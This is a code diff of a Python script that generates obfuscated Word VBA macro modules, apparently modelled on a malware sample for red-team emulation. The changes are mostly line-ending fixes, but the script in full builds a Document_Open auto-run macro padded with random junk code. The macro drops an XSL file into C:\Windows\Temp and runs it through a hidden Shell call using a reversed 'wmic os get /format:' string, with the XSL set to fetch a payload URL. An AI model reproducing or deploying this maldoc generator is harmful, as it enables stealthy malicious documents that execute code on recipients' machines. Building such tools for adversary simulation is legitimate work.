@@ -7,7 +7,7 @@ my_payload_url = "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe"
 
 vba_variables = dict()
 
-english_wordlist_path = os.path.join('\\'.join(__file__.split("/")[0:-3]), "internals", "words.txt")
+english_wordlist_path = os.path.join('\\'.join(os.path.realpath(__file__).split("\\")[0:-3]), "internals", "words.txt")
 
 with open(english_wordlist_path, 'r') as r:
     words = set(r.readlines())
@@ -44,28 +44,28 @@ def get_new_unused_variable_and_definition():
     this_choice = random.randint(1, 4)
 
     if this_choice == 1:  # bool statement
-        return "Dim {} As {}\r\n{} = {}\r\n".format(
+        return "Dim {} As {}\n{} = {}\n".format(
             this_var,
             "Boolean",
             this_var,
             random.choice(["True", "False"])
         )
     elif this_choice == 2:  # int statement
-        return "Dim {} As {}\r\n{} = {}\r\n".format(
+        return "Dim {} As {}\n{} = {}\n".format(
             this_var,
             "Integer",
             this_var,
             str(random.randint(-32000, 32000))
         )
     elif this_choice == 3:  # int statement
-        return "Dim {} As {}\r\n{} = {}\r\n".format(
+        return "Dim {} As {}\n{} = {}\n".format(
             this_var,
             "Long",
             this_var,
             str(random.randint(-32000, 32000))
         )
     elif this_choice == 4:  # int statement
-        return "Dim {} As {}\r\n{} = \"{}\"\r\n".format(
+        return "Dim {} As {}\n{} = \"{}\"\n".format(
             this_var,
             "String",
             this_var,
@@ -86,8 +86,9 @@ def get_new_comment():
                 this_comment = this_comment + " " + wordattempt
                 trying = 0
         comment_counter = comment_counter + 1
-    this_comment = this_comment + "\r\n"
+    this_comment = this_comment + "\n"
     return this_comment
+
 
 def get_filler(min, max):
     vba_to_return = ""
@@ -96,7 +97,7 @@ def get_filler(min, max):
         if random.randint(1, 7) < 7:  # 6 of 7 times, insert a comment after
             vba_to_return = vba_to_return + get_new_comment()
         if random.randint(1, 5) == 1:  # 1  of 5 times, insert a new line
-            vba_to_return = vba_to_return + "\r\n"
+            vba_to_return = vba_to_return + "\n"
     return vba_to_return
 
 def get_var_type():
@@ -114,9 +115,9 @@ def get_var_type():
 mod_1_name = "ThisDocument"
 
 mod_1 = ""
-mod_1 = mod_1 + "Sub Document_Open()\r\n"
+mod_1 = mod_1 + "Sub Document_Open()\n"
 mod_1 = mod_1 + get_filler(8, 11)
-mod_1 = mod_1 + "main\r\nEnd Sub"
+mod_1 = mod_1 + "main\nEnd Sub"
 
 #  Module 2 - this module contains no functional code
 mod_2_name = get_new_variable_name()
@@ -125,7 +126,7 @@ mod_2 = ""
 
 # in sample looks like:
 # Function aoYbuI(aX2A6F9V As Long) As String
-mod_2 = mod_2 + "Function {}({} As {}) As {}\r\n".format(
+mod_2 = mod_2 + "Function {}({} As {}) As {}\n".format(
     get_new_variable_name(),
     get_new_variable_name(),
     get_var_type(),
@@ -140,7 +141,7 @@ mod_2 = mod_2 + "End Function"
 mod_3_name = get_new_variable_name()
 
 mod_3 = ""
-mod_3 = mod_3 + "Function {}({} As {}) As {}\r\n".format(
+mod_3 = mod_3 + "Function {}({} As {}) As {}\n".format(
     get_new_variable_name(),
     get_new_variable_name(),
     get_var_type(),
@@ -148,7 +149,7 @@ mod_3 = mod_3 + "Function {}({} As {}) As {}\r\n".format(
 )
 
 mod_3 = mod_3 + get_filler(10, 12)
-mod_3 = mod_3 + "End Function\r\n"
+mod_3 = mod_3 + "End Function\n"
 
 # real code time
 # code from sample:
@@ -174,7 +175,7 @@ Set {} = CreateObject("Scripting.FileSystemObject")
 Dim {} As Object
 Set {} = {}.CreateTextFile({}, True, True)
 {}.Write {}
-{}.Close\r\n'''.format(
+{}.Close\n'''.format(
     vba_variables['DropFileFunctionName'],
     vba_variables['DropFileFunction_arg1'],
     vba_variables['DropFileFunction_arg2'],
@@ -197,11 +198,11 @@ mod_3 = mod_3 + "End Sub"
 mod_4_name = get_new_variable_name()
 mod_4 = ""
 
-mod_4 = mod_4 + "Sub main()\r\n"
+mod_4 = mod_4 + "Sub main()\n"
 mod_4 = mod_4 + get_filler(16, 20)
 
 vba_variables["form_object"] = get_new_variable_name()
-mod_4 = mod_4 + "Dim {} As Object\r\n".format(
+mod_4 = mod_4 + "Dim {} As Object\n".format(
     vba_variables["form_object"]
 )
 
@@ -209,7 +210,7 @@ mod_4 = mod_4 + get_filler(2, 4)
 
 mod_5_name = get_new_variable_name()  # defining this earlier than normal because the modules reference each other
 
-mod_4 = mod_4 + "Set {} = New {}\r\n".format(
+mod_4 = mod_4 + "Set {} = New {}\n".format(
     vba_variables["form_object"],
     mod_5_name
 )
@@ -218,7 +219,7 @@ mod_4 = mod_4 + get_filler(3, 5)
 
 vba_variables["xsl_payload_text"] = get_new_variable_name()
 
-mod_4 = mod_4 + "Dim {} As String\r\n".format(
+mod_4 = mod_4 + "Dim {} As String\n".format(
     vba_variables["xsl_payload_text"]
 )
 
@@ -226,7 +227,7 @@ mod_4 = mod_4 + get_filler(3, 5)
 
 vba_variables["xsl_path"] = get_new_variable_name()
 
-mod_4 = mod_4 + "Dim {} As String\r\n".format(
+mod_4 = mod_4 + "Dim {} As String\n".format(
     vba_variables["xsl_path"]
 )
 
@@ -234,7 +235,7 @@ mod_4 = mod_4 + get_filler(2, 4)
 
 vba_variables["form_click_sub"] = get_new_variable_name()
 
-mod_4 = mod_4 + "{} = {}.{}.Text\r\n".format(
+mod_4 = mod_4 + "{} = {}.{}.Text\n".format(
     vba_variables["xsl_payload_text"],
     vba_variables["form_object"],
     vba_variables["form_click_sub"]
@@ -242,7 +243,7 @@ mod_4 = mod_4 + "{} = {}.{}.Text\r\n".format(
 
 vba_variables["xsl_file_name"] = get_new_variable_name()
 
-mod_4 = mod_4 + "{} = \"{}\"\r\n".format(
+mod_4 = mod_4 + "{} = \"{}\"\n".format(
     vba_variables["xsl_path"],
     "C:\\\\Windows\\\\Temp\\\\" + vba_variables["xsl_file_name"] + ".xsl"
 )
@@ -251,13 +252,13 @@ mod_4 = mod_4 + get_filler(3, 5)
 
 vba_variables["quote_chr"] = get_new_variable_name()
 
-mod_4 = mod_4 + "{} = Chr(34)\r\n".format(
+mod_4 = mod_4 + "{} = Chr(34)\n".format(
     vba_variables["quote_chr"]
 )
 
 mod_4 = mod_4 + get_filler(1, 2)
 
-mod_4 = mod_4 + "Call {}({}, {})\r\n".format(
+mod_4 = mod_4 + "Call {}({}, {})\n".format(
     vba_variables['DropFileFunctionName'],
     vba_variables['xsl_path'],
     vba_variables['xsl_payload_text']
@@ -267,11 +268,11 @@ mod_4 = mod_4 + get_filler(13, 17)
 
 vba_variables['wmic_rev_string'] = get_new_variable_name()
 
-mod_4 = mod_4 + "{} = StrReverse(\":tamrof/ teg so cimw\")\r\n".format(
+mod_4 = mod_4 + "{} = StrReverse(\":tamrof/ teg so cimw\")\n".format(
     vba_variables['wmic_rev_string']
 )
 
-mod_4 = mod_4 + "Shell {} & {} & {} & {}, 0\r\n".format(
+mod_4 = mod_4 + "Shell {} & {} & {} & {}, 0\n".format(
     vba_variables['wmic_rev_string'],
     vba_variables["quote_chr"],
     vba_variables["xsl_path"],
@@ -280,25 +281,25 @@ mod_4 = mod_4 + "Shell {} & {} & {} & {}, 0\r\n".format(
 
 mod_4 = mod_4 + get_filler(8, 10)
 
-mod_4 = mod_4 + "End Sub\r\n"
+mod_4 = mod_4 + "End Sub\n"
 
 # Module 5 - this is the form
 # mod_5_name is defined above, since it's referenced earlier
 
 mod_5 = ""
 
-mod_5 = mod_5 + "Private Sub {}_Change()\r\n".format(
+mod_5 = mod_5 + "Private Sub {}_Change()\n".format(
     vba_variables["form_click_sub"]
 )
 
-mod_5 = mod_5 + "\r\nEnd Sub\r\n\r\n"
+mod_5 = mod_5 + "\nEnd Sub\n\n"
 
-mod_5 = mod_5 + "Private Sub UserForm_Initialize()\r\n"
+mod_5 = mod_5 + "Private Sub UserForm_Initialize()\n"
 mod_5 = mod_5 + get_filler(3, 5)
-mod_5 = mod_5 + "End Sub\r\n"
-mod_5 = mod_5 + "Public Sub test()\r\n\r\n"
+mod_5 = mod_5 + "End Sub\n"
+mod_5 = mod_5 + "Public Sub test()\n\n"
 mod_5 = mod_5 + get_filler(2, 4)
-mod_5 = mod_5 + "End Sub\r\n"
+mod_5 = mod_5 + "End Sub\n"
 
 xsl_template_2 = '''<?xml version='1.0'?>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace">
@@ -377,28 +378,28 @@ for i in xsl_variables:
 xsl_template_2 = xsl_template_2.replace("$$MyPayloadUrl$$", my_payload_url)
 
 if __name__ == "__main__":
-    print("\r\nModule 1\r\n")
-    print("Name of module: " + mod_1_name + "\r\n")
+    print("\nModule 1\n")
+    print("Name of module: " + mod_1_name + "\n")
     print("-----")
     print(mod_1)
     print("-----")
-    print("\r\nModule 2\r\n")
-    print("Name of module: " + mod_2_name + "\r\n")
+    print("\nModule 2\n")
+    print("Name of module: " + mod_2_name + "\n")
     print("-----")
     print(mod_2)
     print("-----")
-    print("\r\nModule 3\r\n")
-    print("Name of module: " + mod_3_name + "\r\n")
+    print("\nModule 3\n")
+    print("Name of module: " + mod_3_name + "\n")
     print("-----")
     print(mod_3)
     print("-----")
-    print("\r\nModule 4\r\n")
-    print("Name of module: " + mod_4_name + "\r\n")
+    print("\nModule 4\n")
+    print("Name of module: " + mod_4_name + "\n")
     print("-----")
     print(mod_4)
     print("-----")
-    print("\r\nModule 5\r\n")
-    print("Name of module: " + mod_5_name + "\r\n")
+    print("\nModule 5\n")
+    print("Name of module: " + mod_5_name + "\n")
     print("-----")
     print(mod_5)
     print("-----")
